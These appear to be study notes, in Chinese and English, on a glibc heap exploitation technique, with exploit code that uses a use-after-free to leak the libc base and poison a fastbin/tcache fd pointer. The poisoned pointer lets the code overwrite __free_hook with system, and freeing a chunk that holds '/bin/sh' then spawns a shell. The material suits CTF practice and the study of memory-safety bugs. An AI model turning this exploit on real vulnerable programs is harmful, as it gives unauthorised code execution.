## 原理：
我们考虑我们 free 函数的执行流程，首先加入我们有一个 `_libc_free`,我们就会检测释放 `free hook`

那么，如果我们能够修改我们的 free_hook 函数指向的内容，相当于篡改了我们的 `free_hook` 函数的功能，那么我们应该就可以直接获得我们的结果。

![[Pasted image 20240211140317.png]]

Firstly, remember that for fast chunks in the fastbin, the location of the next chunk in the bin is specified by the `fd` pointer. This means if chunk `a` points to chunk `b`, once chunk `a` is freed the next chunk in the bin is chunk `b`.

In a double-free, we attempt to **control** `fd`. By overwriting it with an arbitrary memory address, we can tell `malloc()` _where the next chunk is to be allocated_. For example, say we overwrote `a->fd` to point at `0x12345678`; once `a` is free, the _next chunk on the list_ will be `0x12345678`_._

## 条件：
我们可以使用我们的 UAF 漏洞。
## 执行流程
第一步：先利用我们的 UAF 漏洞，把我们的 libc 地址泄露出。
```cpp
create(0,0x500)
create(1,0x10)
delete(0)
show(0)
libc_base=l64()-0x3ebca0(计算得到)
```

第二步：利用我们的 UAF 漏洞，在我们的某个堆释放后，再在对应的位置填入我们的 `free_hook` 地址，**让我们的系统把我们的对应位置误认为是我们的一个堆**。

注意这里，我们要用一个堆块先去占用，我们申请的第二个堆块才是我们的 `free_hook` 的
```python
system,binsh=get_sb()
free_hook=libc_base+libc.sym['__free_hook']

create(2,0x10)
delete(2)
edit(2,p64(free_hook))
# 获取我们的free_hook
create(3,0x10)
create(4,0x10)
edit(4,p64(system))

# 像我们的块中写入binsh
create(5,0x10)
edit(5,'/bin/sh\x00')
delete(5)
```

